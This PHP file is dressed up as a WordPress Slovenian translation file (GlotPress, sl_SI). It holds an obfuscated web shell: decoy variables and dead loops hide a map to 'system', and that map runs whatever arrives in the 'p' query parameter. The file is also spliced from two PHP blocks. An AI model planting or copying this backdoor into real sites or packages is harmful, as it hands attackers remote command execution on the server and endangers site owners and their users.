<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
return ['x-generator'=>'GlotPress/4.0.0-beta.2','translation-revision-date'=>'2024-01-18 05:40:05+0000','plural-forms'=>'nplurals=4; plural=(n % 100 == 1) ? 0 : ((n % 100 == 2) ? 1 : ((n % 100 == 3 || n % 100 == 4) ? 2 : 3));','project-id-version'=>'WordPress - 6.4.x - Development','language'=>'sl_SI','messages'=>['%s update available'=>'%s razpoložljiva posodobitev' . "\0" . '%s razpoložljivi posodobitvi' . "\0" . '%s razpoložljive posodobitve' . "\0" . '%s razpoložljivih posodobitev']];
$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>